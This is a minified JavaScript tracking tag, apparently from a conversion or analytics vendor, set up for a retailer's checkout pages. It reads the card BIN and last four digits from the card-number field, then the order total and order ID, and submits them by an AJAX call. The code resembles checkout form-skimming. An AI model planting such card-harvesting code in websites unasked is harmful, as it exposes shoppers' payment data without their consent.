...
function mac(a,b,c){a=a.pop();for(b=a.length-1;0<=b;b-=1)c.unshift(a[b])}function qs(a){var b=a.pop();(b=document.querySelectorAll(b))&&1===b.length?a.push(b):a.push("ERROR: not found")}function cqs(a){for(var b=a.pop(),c=[],d,e=0;e<b.length;e++)(d=document.querySelectorAll(b[e]))&&0<d.length||c.push(b[e]);if(0<c.length)a.push(JSON.stringify(c));else return!0}function qsa(a){var b=a.pop();(b=document.querySelectorAll(b))&&0<b.length?a.push(b):a.push("ERROR: not found")}
function qs1(a){var b=a.pop();(b=document.querySelector(b))?a.push(b):a.push("ERROR: not found")}function cccc(a,b){4!==b.card_last4.length?a.push(!1):6!==b.card_bin.length?a.push(!1):b.prev===b.card_last4?a.push(!1):(a.push(!0),b.prev=b.card_last4)}function dijx(a){var b=a.pop(),c=a.pop(),d=a.pop();a=a.pop();window.up&&b&&c&&d&&a&&(b={eventCategory:String(c),eventAction:String(b),eventLabel:String(d),eventValue:JSON.stringify(a)},window.up("send","diagnostic",b))}
function gqp(a){var b="ERROR: not found",c=a.pop(),d=window.location.search.substring(1);if(-1<d.indexOf(c))for(var d=d.split("&"),e=0;e<d.length;e++){var f=d[e].split("=");f[0]===c&&(b=f[1])}a.push(b)}function ggv(a){var b=a.pop();a.push("undefined"===typeof window[b]?"ERROR: not found":window[b])}function snd(a){var b=a.pop();if(b)a.push(b.replace(/[^0-9.$]*/g,""));else return!0};

/*Conf*/
var qsa = function (stack) {
    var name = stack.pop();
    var els = document.querySelectorAll(name);
    if (els && els.length > 0) {
        stack.push(els);
    } else {
        stack.push('ERROR: not found');
    }
};
var c4 = function (stack, msg, code, context){
    if(msg['card_last4'].length !== 4){
        stack.push(false);
        return;
    } else if(msg['card_bin'].length !== 6){
        stack.push(false);
        return;
    } else if( msg['prev'] === msg['card_last4'] ) {
        stack.push(false);
        return;
    } else {
        stack.push(true);
    }
    msg['prev'] = msg['card_last4'];
};
var m_id = [pid,'conf_7dbb6cf1','conf_id',st,'i-d14c314c.210de4547fb42','req_id',st];

/* submit bin */
var oi_1 = ['card_accountNumber',id,it,cc,c4,iff,'submit',ajx];
v1(['/checkout',mx,m_id,mac,'oi_1',2000,oi,oi_1]);

var m_2 = ['div.callOut.grey>ul>li>strong',qsa,1,nth,it,'total_amount',st];
var oi_2 = [m_2,mac,'oi_2',_oi,'submit',ajx];
/* submit total */
v1(['/revieworder',mx,m_id,mac,'oi_2',2000,oi,oi_2]);

/* confirmation */
v1(['/order-confirm',mx,m_id,mac,'span.boxTitle.brandonLight>a.instrumentedElement',qs,1,nth,it,'order_id',st,'success','status',st,'response',ajx]);}());